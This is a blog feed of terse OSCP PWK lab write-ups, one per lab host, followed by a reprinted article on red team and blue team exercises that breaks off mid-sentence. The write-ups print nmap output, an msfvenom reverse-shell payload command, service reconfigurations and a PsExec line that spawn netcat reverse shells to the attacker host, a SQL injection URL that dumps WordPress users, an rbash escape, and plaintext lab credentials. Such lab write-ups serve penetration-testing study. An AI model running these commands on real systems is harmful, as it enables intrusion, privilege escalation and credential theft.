        <content type="html"><![CDATA[<p># Nmap 7.70 scan initiated Sat May 4 15:26:35 2019 as: nmap -Pn -sCV -p21 -oN nmap/Basic_10.11.1.226.nmap 10.11.1.226 Nmap scan report for 10.11.1.226 Host is up (0.095s latency).</p><p>PORT STATE SERVICE VERSION 21/tcp open ftp GuildFTPd MAC Address: 00:50:56:89:7D:67 (VMware) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows</p><p>Service detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/">https://nmap.org/submit/</a> . # Nmap done at Sat May 4 15:26:52 2019 – 1 IP address (1 host up) scanned in 17.05 seconds</p><p>ftp can read the whole disk of the box</p><p>at-tftp installed</p><p><img src="/images/1-1.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.227 攻略</title>
      <link href="02a906adeba6/"/>
      <url>02a906adeba6/</url>
      
        <content type="html"><![CDATA[<p>Starting Nmap 7.70 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2019-05-05 23:05 CST Warning: 10.11.1.227 giving up on port because retransmission cap hit (1). Nmap scan report for 10.11.1.227 Host is up (0.32s latency). Not shown: 677 closed ports, 312 filtered ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 21/tcp open ftp 25/tcp open smtp 80/tcp open http 135/tcp open msrpc 139/tcp open netbios-ssn 443/tcp open https 445/tcp open microsoft-ds 1025/tcp open NFS-or-IIS 3372/tcp open msdtc 5800/tcp open vnc-http 5900/tcp open vnc MAC Address: 00:50:56:89:72:CB (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 14.35 seconds</p><p>realvnc has a auth bypass exp and ms08-067 is possible</p><p><img src="/images/2-1.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.229 Mail攻略</title>
      <link href="66eef1661544/"/>
      <url>66eef1661544/</url>
      
        <content type="html"><![CDATA[<p># Nmap 7.70 scan initiated Sun May 5 23:42:47 2019 as: nmap -Pn -T4 –max-retries 1 –max-scan-delay 20 –defeat-rst-ratelimit –open -oN nmap/Quick_10.11.1.229.nmap 10.11.1.229 Warning: 10.11.1.229 giving up on port because retransmission cap hit (1). Nmap scan report for 10.11.1.229 Host is up (0.29s latency). Not shown: 988 filtered ports, 3 closed ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 21/tcp open ftp 25/tcp open smtp 80/tcp open http 110/tcp open pop3 135/tcp open msrpc 139/tcp open netbios-ssn 143/tcp open imap 1025/tcp open NFS-or-IIS 3389/tcp open ms-wbt-server MAC Address: 00:50:56:93:4C:3D (VMware)</p><p># Nmap done at Sun May 5 23:43:11 2019 – 1 IP address (1 host up) scanned in 24.16 seconds</p><p>80 run a webdav server</p><p>put copy and move is allowed</p><p>but asp or aspx is not allowed</p><p>other file type is not supported or not allowed</p><p>IIS 6.0 webdav has a exp that .asp;.txt is allowed</p><p><img src="/images/3-1.png"></p><p><img src="/images/4-1.png"></p><p>windows 2003 with the user<img src="/images/5-1.png"></p><p>we have could use something to priv esca</p><p><a href="https://simonuvarov.com/privilege-escalation-via-token-kidnapping/">https://simonuvarov.com/privilege-escalation-via-token-kidnapping/</a></p><p><img src="/images/7-1.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.230 kevin 攻略</title>
      <link href="82d37dcafecb/"/>
      <url>82d37dcafecb/</url>
      
        <content type="html"><![CDATA[<p>MS17-010</p><p><img src="/images/8-1.png"></p><p><img src="/images/9-1.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.234 Core攻略</title>
      <link href="6c459751ee3e/"/>
      <url>6c459751ee3e/</url>
      
        <content type="html"><![CDATA[<p>wordpress installed</p><p>admin:princess</p><p>Linux Kernel exp</p><p><a href="https://www.exploit-db.com/exploits/14814">https://www.exploit-db.com/exploits/14814</a></p><p><img src="/images/10-1.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.237 humble攻略</title>
      <link href="99388810f37f/"/>
      <url>99388810f37f/</url>
      
        <content type="html"><![CDATA[<p>80 443 22</p><p><a href="https://10.11.1.237/test.html">https://10.11.1.237/test.html</a></p><p><img src="/images/11.png"></p><p>/cgi-bin/mongo/2.2.3/dbparse.py</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.251 fw_IT攻略</title>
      <link href="c2b1092b1838/"/>
      <url>c2b1092b1838/</url>
      
        <content type="html"><![CDATA[<p>Starting Nmap 7.70 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2019-05-04 17:32 CST Nmap scan report for 10.11.1.251 Host is up (0.26s latency). Not shown: 998 filtered ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http MAC Address: 00:50:56:89:34:D1 (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 19.08 seconds</p><p>/wp/</p><p>wordpress found</p><p>use wpscan</p><p>SQL injection found</p><p><img src="/images/22.png"></p><p><a href="https://cxsecurity.com/issue/WLB-2013020035">https://cxsecurity.com/issue/WLB-2013020035</a></p><p><a href="http://10.11.1.251/wp/wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group%5C_concat(user%5C_login,0x3a,user%5C_pass)+from+wp%5C_users%23">http://10.11.1.251/wp/wp-content/plugins/wp-forum/feed.php?topic=-4381+union+select+group\_concat%28user\_login,0x3a,user\_pass%29+from+wp\_users%23</a></p><p><img src="/images/33.png"></p><p>sean:?????</p><p>ssh login can sudo ALL 7eab8563146f16140c769072580cbcb3</p><p><img src="/images/44.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.252 fw_DEV攻略</title>
      <link href="734ad4437774/"/>
      <url>734ad4437774/</url>
      
        <content type="html"><![CDATA[<p>Nmap scan report for 10.11.1.252 Host is up (0.13s latency).</p><p>PORT STATE SERVICE VERSION 8000/tcp open http Apache httpd 2.2.3 ((CentOS)) |_http-open-proxy: Proxy might be redirecting requests |_http-server-header: Apache/2.2.3 (CentOS) | http-title: TimeClock Software :: Dev. Dpt. Thinc.local :: Log In |_Requested resource was login.php 8888/tcp open http-proxy Squid http proxy 3.3.8 |_http-server-header: squid/3.3.8 |_http-title: Endian Firewall - The requested URL could not be retrieved MAC Address: 00:50:56:89:6B:F4 (VMware)</p><p><a href="https://www.exploit-db.com/exploits/39404">https://www.exploit-db.com/exploits/39404</a></p><p>sql injection bypass password</p><p><img src="/images/55.png"></p><p>ssh <a href="mailto:&#106;&#x30;&#104;&#110;&#64;&#49;&#48;&#46;&#49;&#49;&#46;&#49;&#46;&#x32;&#x35;&#50;">&#106;&#x30;&#104;&#110;&#64;&#49;&#48;&#46;&#49;&#49;&#46;&#49;&#46;&#x32;&#x35;&#50;</a> -p 22000 bzuisJDnuI6WUDl</p><p>have a mysql local priv EXP</p><p><a href="https://www.exploit-db.com/exploits/1518">https://www.exploit-db.com/exploits/1518</a></p><p><img src="/images/66.png"></p><p>9be35de7610eb55b8c1aeb6e18bf4c9f</p><p><img src="/images/123-1.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.13 Bob攻略</title>
      <link href="c0f7c7d36974/"/>
      <url>c0f7c7d36974/</url>
      
        <content type="html"><![CDATA[<p>PORT STATE SERVICE VERSION 21/tcp open ftp Microsoft ftpd 80/tcp open http Microsoft IIS httpd 5.1 |_http-server-header: Microsoft-IIS/5.1 | vulners: | cpe:/a:microsoft:iis:5.1: | CVE-2008-1446 9.0 <a href="https://vulners.com/cve/CVE-2008-1446">https://vulners.com/cve/CVE-2008-1446</a> |_ CVE-2009-1535 7.6 <a href="https://vulners.com/cve/CVE-2009-1535">https://vulners.com/cve/CVE-2009-1535</a> 3389/tcp open tcpwrapped</p><p><strong>存在漏洞</strong>: FTP未合理设置上传权限,可以上传木马至网页根目录</p><p>利用msfvenom生成asp木马文件</p><p>msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.11.0.80 LPORT=4444 -f asp &gt; 1.asp</p><p>得到低权限反弹shell之后使用<a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/accesschk.zip">accesschk</a>来检查各个文件及服务有没有misconfigration</p><p>accesschk.exe /accepteula -uwcqv IWAM_BOB *</p><p>发现SSDPSRV和upnphost这两个服务存在误配置</p><p>命令行修改SSDPSRV所运行的.exe文件为我们想要运行的文件</p><ul><li>sc config SSDPSRV binpath= “c:\inetpub\wwwroot\nc.exe -nv 10.11.0.222 9090 -e cmd.exe”</li><li>sc config SSDPSRV obj= “.\LocalSystem” password= “”</li><li>sc config SSDPSRV start= “demand” //mmp没文章要说加这个命令,查了google上某国人文章才知道,原来的服务是被disable的!!!妈的我居然忽略了报错信息!!! 3小时—RIP</li><li>net start SSDPSRV</li></ul><p>SYSTEM shell get√</p><p><strong>proof.txt</strong> a26f37da4583ff68f44d133d12ae3459</p><p>参考:<a href="http://fuzzysecurity.com/tutorials/16.html">http://fuzzysecurity.com/tutorials/16.html</a></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.22 Barry攻略</title>
      <link href="4e9ac9316c72/"/>
      <url>4e9ac9316c72/</url>
      
        <content type="html"><![CDATA[<p><strong>存在漏洞</strong>:Samba 2.2.x - ‘call_trans2open’ Remote Buffer Overflow</p><p>exploitDB上有漏洞利用源码,msfconsole里直接有ruby脚本</p><p>使用,拿到shell√</p><p><strong>proof.txt</strong> da690f91f46eb888719fe942efed2993</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.24 Payday攻略</title>
      <link href="935efc4e29f6/"/>
      <url>935efc4e29f6/</url>
      
        <content type="html"><![CDATA[<p><strong>存在漏洞 :</strong> web界面管理员密码与linux账户管理员密码都为弱密码</p><p>发现后台管理员面板10.11.1.24/admin 帐号密码为弱密码admin</p><p>尝试上传文件,发现有上传文件扩展名限制,不能上传.php文件</p><p>尝试上传.PHP文件,成功</p><p>用msfvenom编译php shellcode发现问题,尝试第三方webshell</p><p>使用b374k webshell  <a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/b374k.zip">b374k</a></p><p><a href="https://github.com/b374k/b374k#b374k-shell-32">https://github.com/b374k/b374k#b374k-shell-32</a> 编译webshell,上传,得到低权限交互界面</p><p>cat /etc/passwd</p><p>发现疑似管理员帐号patrick</p><p>按照之前获取CMS密码的经验尝试账户名为密码登录</p><p>成功登录</p><p>shell get √</p><p><strong>proof.txt</strong> c19cf7756cfef80636d95d9e73ef4a2e</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.44 Pi攻略</title>
      <link href="283c3f9c553d/"/>
      <url>283c3f9c553d/</url>
      
        <content type="html"><![CDATA[<p>Starting Nmap 7.70 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2019-05-15 10:35 CST Nmap scan report for 10.11.1.44 Host is up (0.28s latency). Not shown: 924 closed ports, 74 filtered ports Some closed ports may be reported as filtered due to –defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 8000/tcp open http-alt MAC Address: 00:50:56:89:74:61 (VMware)</p><p>Nmap done: 1 IP address (1 host up) scanned in 4.85 seconds</p><p> </p><p>dependency</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.49 Bethany攻略</title>
      <link href="392859e50ef9/"/>
      <url>392859e50ef9/</url>
      
        <content type="html"><![CDATA[<p>nmap快速扫描结果并不准确！需要对所有端口进行扫描</p><p>发现存在9505端口。</p><p>浏览器直接访问，发现存在HFS文件分享系统。</p><p>MSF现成利用脚本 windows/http/rejetto_hfs_exec</p><p>目标机器打开了防火墙，所以记得把LPORT改成443</p><p><img src="/images/TIM%E6%88%AA%E5%9B%BE20180608080820.png"></p><p>可以得到地权限的shell</p><p><img src="/images/1-1.png"></p><p>net user 查看一下存在的用户，发现存在alice。</p><p>而alice是实验室的地一台机子且已经被我们拿下，已知那台机子alice的密码是aliceishere，可能这台机子上也是这个密码。</p><p>我们向目标机器上传PsExec.exe文件和nc.exe    link: <a href="http://wp.jinzz.cc/wp-content/uploads/2018/01/PsExec.zip">PsExec</a>  <a href="http://wp.jinzz.cc/wp-content/uploads/2018/05/nc.zip">nc</a></p><ul><li>PsExec.exe -accpeteula \\Bethany2 -ua alice -pa aliceishere C:\HFS\nc.exe -vn 10.11.0.94 443 -e cmd.exe</li></ul><p><img src="/images/2-1.png"></p><p><img src="/images/3-1.png"></p><p>shell get √</p><p><strong>proof.txt</strong> 1f1f1eb58e44d5d24e44070b3b29c0d5</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.5 Alice攻略</title>
      <link href="ed4bf73b2114/"/>
      <url>ed4bf73b2114/</url>
      
        <content type="html"><![CDATA[<p>PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows XP microsoft-ds 1025/tcp open msrpc Microsoft Windows RPC 3389/tcp open ms-wbt-server?</p><p>MS03-026</p><p>exploit/windows/dcerpc/ms03_026_dcom</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.7 Pedro攻略</title>
      <link href="20271eeb521d/"/>
      <url>20271eeb521d/</url>
      
        <content type="html"><![CDATA[<p>PORT STATE SERVICE VERSION 3389/tcp open ms-wbt-server Microsoft Terminal Service MAC Address: 00:50:56:89:71:10 (VMware)</p><p> </p><p>dependency</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.71 Alpha攻略</title>
      <link href="1e55c5a567e2/"/>
      <url>1e55c5a567e2/</url>
      
        <content type="html"><![CDATA[<p><a href="https://forums.offensive-security.com/showthread.php?t=4689">https://forums.offensive-security.com/showthread.php?t=4689</a></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.75 Bruce攻略</title>
      <link href="957b232466ee/"/>
      <url>957b232466ee/</url>
      
        <content type="html"><![CDATA[<p>MS17-010 manuel exploit</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.72 Beta攻略</title>
      <link href="34e66dc80368/"/>
      <url>34e66dc80368/</url>
      
        <content type="html"><![CDATA[<p>mail管理系统弱密码 root root</p><p>发现ryuu账户有一份邮件包含了ssh登录密码</p><p>username: ryuu password: QUHqhUPRKXMo4m7k</p><p>break rbash：<a href="https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html">https://www.cnblogs.com/xiaoxiaoleo/p/8450379.html</a></p><p>hacker@beta:<del>$ BASH_CMDS[a]=/bin/sh;a<br>hacker@beta:</del>$ export PATH=$PATH:/bin/<br>hacker@beta:~$ export PATH=$PATH:/usr/bin</p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PWK-LAB 10.11.1.73 Gamma攻略</title>
      <link href="6564d7884812/"/>
      <url>6564d7884812/</url>
      
        <content type="html"><![CDATA[<p>PORT STATE SERVICE VERSION 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows 7 Professional 7601 Service Pack 1 microsoft-ds (workgroup: WORKGROUP) 554/tcp open rtsp? 1100/tcp open java-rmi Java RMI Registry | rmi-dumpregistry: | creamtec/ajaxswing/JVMFactory | com.creamtec.ajaxswing.core.JVMFactory_Stub | @10.11.1.73:49157 | extends | java.rmi.server.RemoteStub | extends |_ java.rmi.server.RemoteObject 2869/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) 3306/tcp open mysql MySQL (unauthorized; French) 3389/tcp open ms-wbt-server? |_ssl-date: 2019-05-09T12:17:10+00:00; -22s from scanner time. 5357/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Service Unavailable 5800/tcp open vnc-http TightVNC (user: gamma; VNC TCP port: 5900) |_http-title: TightVNC desktop [gamma] 5900/tcp open vnc VNC (protocol 3.8) | vnc-info: | Protocol version: 3.8 | Security types: | VNC Authentication (2) | Tight (16) | Tight auth subtypes: |_ STDV VNCAUTH_ (2) 8080/tcp open http Apache httpd 2.4.9 ((Win32) PHP/5.5.12) |_http-open-proxy: Proxy might be redirecting requests | http-robots.txt: 1 disallowed entry |_/testmysql.php |_http-server-header: Apache/2.4.9 (Win32) PHP/5.5.12 |_http-title: Site doesn’t have a title (text/html). 10243/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found 49152/tcp open msrpc Microsoft Windows RPC 49153/tcp open msrpc Microsoft Windows RPC 49154/tcp open msrpc Microsoft Windows RPC 49155/tcp open msrpc Microsoft Windows RPC 49156/tcp open msrpc Microsoft Windows RPC 49157/tcp open rmiregistry Java RMI 49159/tcp open rmiregistry Java RMI</p><p><a href="http://10.11.1.73:8080/robots.txt">http://10.11.1.73:8080/robots.txt</a></p><p>User-agent: * Allow: /PHP/</p><p><a href="http://10.11.1.73:8080/PHP/">http://10.11.1.73:8080/PHP/</a></p><p><a href="https://www.ovidentia.org/index.php?tg=posts&amp;flat=1&amp;forum=7&amp;thread=219&amp;pos=">https://www.ovidentia.org/index.php?tg=posts&amp;flat=1&amp;forum=7&amp;thread=219&amp;pos=</a></p><p>default admin credentials is</p><p><a href="mailto:&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#97;&#x64;&#109;&#x69;&#x6e;&#x2e;&#98;&#97;&#x62;">&#97;&#x64;&#x6d;&#105;&#x6e;&#x40;&#97;&#x64;&#109;&#x69;&#x6e;&#x2e;&#98;&#97;&#x62;</a>:012345678</p><p>在网站设置处更改网站上传文件限制sites/name/File upload configuration/</p><p>change the size limit more and change the path to C:\wamp\www\PHP\/images</p><p>upload file in the forum and the file can be found in <a href="http://10.11.1.73:8080/PHP/images/forums/">http://10.11.1.73:8080/PHP/images/forums/</a></p><p>upload webshell to it</p><p>use netstat -an found servel port which dont have appear in the nmap scan result.</p><p>the local machine installed Symantec Endpoint Protection Manager which has RCE</p><p><a href="https://www.exploit-db.com/exploits/31853">https://www.exploit-db.com/exploits/31853</a></p><p>forward the port 9090 to local and use exp to get root</p><p><img src="/images/TIM%E5%9B%BE%E7%89%8720190515105907.png"></p>]]></content>
      
      
      <categories>
          
          <category> oscp-writeup </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Red Team VS Blue Team</title>
      <link href="041e5c564821/"/>
      <url>041e5c564821/</url>
      
        <content type="html"><![CDATA[<h3 id="Playing-the-role-of-an-attacker-can-make-your-team-better-at-defense-Learn-how-in-our-step-by-step-guide-to-war-gaming-your-security-infrastructure-—-from-involving-the-right-people-to-weighing-a-hypothetical-vs-live-event"><a href="#Playing-the-role-of-an-attacker-can-make-your-team-better-at-defense-Learn-how-in-our-step-by-step-guide-to-war-gaming-your-security-infrastructure-—-from-involving-the-right-people-to-weighing-a-hypothetical-vs-live-event" class="headerlink" title="Playing the role of an attacker can make your team better at defense. Learn how in our step-by-step guide to war gaming your security infrastructure — from involving the right people to weighing a hypothetical vs. live event."></a>Playing the role of an attacker can make your team better at defense. Learn how in our step-by-step guide to war gaming your security infrastructure — from involving the right people to weighing a hypothetical vs. live event.</h3><p>The military does it. The Government Accountability Office does it. So does the National Security Agency. The concept has made its way into the corporate world, too: war-gaming the security infrastructure.</p><p>Red team-blue team exercises take their name from their military antecedents. The idea is simple: One group of security pros — a red team — attacks something, and an opposing group — the blue team — defends it. Originally, the exercises were used by the military to test force-readiness. They have also been used to test physical security of sensitive sites like nuclear facilities and the Department of Energy’s National Laboratories and Technology Centers. In the ‘90s, experts began using red team-blue team exercises to test information security systems.</p><p>[ Learn <a href="https://www.csoonline.com/article/2126101/access-control-10-tips-for-a-successful-penetration-testing-program.html">10 tips for a successful penetration testing program</a>. | Get the latest from CSO by <a href="http://www.csoonline.com/newsletters/signup.html#tk.cio_fsb">signing up for our newsletters</a>. ]</p><p><img src="https://i.connatix.com/s3/connatix-uploads/49326d3f-b75d-4538-b661-c6487d9bca39/1.jpg?mode=stretch&connatiximg=true&scale=both&height=225&width=400"></p><p>Companies in any industry can benefit from a red team-blue team exercise by following this advice.</p><h2 id="The-basics"><a href="#The-basics" class="headerlink" title="The basics"></a>The basics</h2><p>Red teams are external entities brought in to test the effectiveness of a security program. They are hired to emulate the behaviors and techniques of likely attackers to make it as realistic as possible.</p><p>For example, this team may try and get into a business building by pretending to be a delivery driver in order to plant a device for easy outside access (think port 80, 443, 53 for HTTP, HTTPS or DNS respectively). They may try also try social engineering, phishing, vishing or simply posing as a company employee.</p><p>On the other side lies the blue team, the internal security team that is charged with stopping these simulated attacks. A growing number of companies, however, are not using formal blue teams in their exercises. The idea is that they get a more realistic idea of their true defensive capabilities by seeing how their security teams react to the simulation without prepping.</p><p>The ultimate aim of such test is to test an organization’s’ security maturity as well as its ability to detect and respond to an attack. Such an exercise could take up to three or four weeks depending on the simulation, the people involved and the attacks being tested.</p><p><strong>[ <a href="https://pluralsight.pxf.io/c/321564/424552/7490?u=https://www.pluralsight.com/paths/upgrading-your-technology-career">Looking to upgrade your career in tech? This comprehensive online course teaches you how.</a> ]</strong></p><h2 id="Red-team"><a href="#Red-team" class="headerlink" title="Red team"></a>Red team</h2><p>On the surface such exercises carried out by the likes of Fortune 500 companies, governments and even NATO (with its Crossed Swords exercise) have clear benefits. Yet red teaming continues to often be confused with pen testing.</p><p>[**Related: <a href="http://www.csoonline.com/article/3046586/security/a-blue-teams-reference-guide-to-dealing-with-ransomware.html">A Blue Team’s reference guide to dealing with ransomware</a>**]</p><p>“Red teaming is in vogue this year. Every company and their dog all of a sudden are red team experts,” says Daniel Cuthbert, COO of SensePost. “Sadly, our industry thrives on firsts, often snake-oil but sounding sexy and professing to do X when in reality they have no idea what they are doing. Red teaming, as marketed by many a company, is often just penetration testing with a slightly extended scope.”</p><p>This view is echoed by other professionals, and there’s particular disdain for what red teamers are supposed to look like. Richard De Vere, director of social engineering consultancy Anti-Social Engineer, says he “despises” the view that red teaming entities equipped in black camouflage - “that’s not what it’s about” - and says there are misconceptions too over what team you need. “They are social engineers, not failed army guys. Red Teams need definition.  They should not be stuck behind middle management with no scope.”</p><p>As such, perhaps it is little surprise that red teaming maturity varies across companies. “From a technical sense, it can vary from very good to poor,” says Quentyn Taylor, director of information security at Canon Europe, asked on how advanced businesses are with red teaming. “However, the main issue is organizations not understanding what they are trying to get from red teaming, what they are trying to simulate.”</p><p>With that in mind, here’s a six-step guide to getting red teaming right.</p><h4 id="1-Understand-what-you’re-trying-to-do"><a href="#1-Understand-what-you’re-trying-to-do" class="headerlink" title="1. Understand what you’re trying to do"></a>1. Understand what you’re trying to do</h4><p>“The first point is to understand what it is you are trying to do. If red teaming, you are trying to simulate a likely attack, which means the attacker has to adjust their attack to suit who/what they are emulating,” says Taylor. “As a person contracting companies to perform this task, it is critical that you only work with companies who understand this principle. Similarly, the defenders must also have the appropriate tools and information as they would do in a real attack.”</p><p>“I would advise companies to think about what they want to achieve from the red team,” adds Rob Shapland, principal cyber-security consultant at information security and pen testing consultancy First Base Technologies. “It’s not really appropriate for companies that do not have a mature cyber-security strategy. However, if defenses have been implemented, then red teaming should be an exercise that is done regularly and can be of immense value. Ensure that the report you get from the red team is of value, and that the recommendations are implemented where viable.”</p><p>Cuthbert agrees on the maturity of the business: “A red team is meant for those companies who feel they have done all they can to implement security measures and need the ultimate test. A red team exercise is the need for the team to truly target the organization as an adversary would do, so that both sides can understand, control the environment, and implement a more robust security posture.”</p><h4 id="2-Choose-the-right-partner"><a href="#2-Choose-the-right-partner" class="headerlink" title="2. Choose the right partner"></a>2. Choose the right partner</h4><p>“Red teaming can attract the wrong kinds of InfoSec professionals, ones that aren’t directly in it to improve security but ones that believe that to break into the company is the only goal,” says Taylor. “My advice: Listen to the red teaming company, and if you don’t like what you hear, walk away. If they aren’t talking about how their services can benefit and how you can have an inclusive test, then they may not be the kind testers you need.”</p><p>Cuthbert, adds that a red team could be as many as eight people, with everyone from a mission planner, a reconnaissance and physical breach specialist to those skilled in communications and IT. Shapland adds a team could also include an expert on vishing.</p><p>[**Related: <a href="http://www.csoonline.com/article/3196828/data-protection/6-security-measures-youve-put-off-too-long.html">6 security measures you’ve put off too long</a>**]</p><p>“Look at the pedigree of the company you are choosing. Do they name individuals who make up the team? If not, will they supply names? If we use the same process as above, a smaller highly skilled team, then understanding who the team is, is key,” says Cuthbert. “Perform research on those individuals. Are they involved in this industry? Do they create tools, research, speak at conferences or give you an air of ‘this person knows what they are doing?”</p><p>Shapland adds that it’s vital to have the right team leader.</p><h4 id="3-Surprise-you-may-not-need-a-blue-team"><a href="#3-Surprise-you-may-not-need-a-blue-team" class="headerlink" title="3. Surprise - you may not need a blue team"></a>3. Surprise - you may not need a blue team</h4><p>“You don’t always need a blue team,” says De Vere. “Remediation and improvements can be made by the organization using employees that have full time roles in IT and other departments. ​An experienced penetration tester will be able to understand the attacks from the blue side and later work with the client to defend against malicious attackers. This might sound crazy, but it’s cost effective and convenient - it’s a little like playing chess against yourself.”</p><h4 id="4-Communicate-clearly-with-all-involved"><a href="#4-Communicate-clearly-with-all-involved" class="headerlink" title="4. Communicate clearly with all involved"></a>4. Communicate clearly with all involved</h4><p>Cuthbert argues that a red team’s success will ultimately come down to a clear and understood brief, constant communication and an understanding of what red teaming ultimately entails. “You need clear and concise communication between the client and company/internal group requesting the red teaming operation,” says Cuthbert, who notes that the client should be totally clear what the red team will - and won’t - carry out.</p><p>“At the foundation of a red team is the realization that it will do everything in its skillset and experience to gain access and exploit vulnerabilities in the company’s infrastructure to give a realistic and concise overview, and they’ll do it without getting caught,” says Cuthbert. “The overall person in charge of the team needs experience in every area of red teaming, but also needs to understand the impact on the business of doing the testing, and how best to present the findings to be useful to the organization.”</p><h4 id="5-Prepare-prepare-prepare"><a href="#5-Prepare-prepare-prepare" class="headerlink" title="5. Prepare, prepare, prepare"></a>5. Prepare, prepare, prepare</h4><p>“Recon! Do lots and lots of boring recon,” says De Vere, whose firm carries out red teaming for a number of clients. “​I try to build a really accurate picture of the organization, and I want to know everything about them. Days are spent researching them. For example, if I am entering the building on the pretext of being agency staff, I will create a fake business to back me up. If the ingress relies on gadgetry like invisible headphones, I will wear these to remain in constant contact with an assistant that will document the attack.”</p><p>“I will have a few other gadgets like GSM bugs and Wi-Fi Micro cameras charged up and ready to be deployed. I will also have a small Raspberry Pi dropbox that I can use to attack Wi-Fi from a distance and leave on-site for remote access during and after the test,” De Vere adds. “I believe 90 percent of the work is in preparation.”</p><p>Taylor adds, “Make sure you understand what the end goal is, make sure that all people involved know what they should be doing and what the parameters of the test are. Make sure that you have a contact point in case something goes wrong / you need verification. Essentially, understand what you are going to get and how it will help you become more secure.”</p><h4 id="6-Rinse-and-repeat"><a href="#6-Rinse-and-repeat" class="headerlink" title="6. Rinse and repeat"></a>6. Rinse and repeat</h4><p>Finally, it’s vital that teams learn continually throughout the exercise, and repeat as often as they deem necessary. “From the perspective of the red team, constant learning is required to keep up to date with the latest attacks,” adds Shapland. “Because it’s based on real-world threats, we need to be current on what attacks the real threat actors are using. From the perspective of the organization commissioning the red team, it’s very important to learn from each exercise, implement new defenses and processes, and then test again. This should be a constant cycle.”</p><p>“If you’re a small SME that really hasn’t got the budget for this, maybe you can do this once every two years and get some cheaper work and training to fill in-between,” says De Vere. “If you’re a multinational this should be a constant task - a bit like painting the golden gate bridge. Test can be repeated, but you should try and recreate different attacks each time, different MO’s, different skill sets - even different testers.”</p><h2 id="Blue-team"><a href="#Blue-team" class="headerlink" title="Blue team"></a>Blue team</h2><p>In many ways, parenting and security have a lot in common. No book exists that provides all of the answers. There is no silver bullet, and both roles can be overwhelmingly stressful. Getting into the mind of the enemy, though, might be a little easier done than understanding the inner workings of the teenage mind.</p><p>Parents are the blue teams that want to know how susceptible their children are to life’s many temptations and pitfalls. The red teams, all of the possible dangers that could hurt a child, are those who want to get in. The greater challenge is for the blue team to protect their domain by finding that one vulnerability that can be exploited without putting too many limitations and restrictions on users.</p><p>There is only so much preparation a blue team can do without defeating the purpose of running a 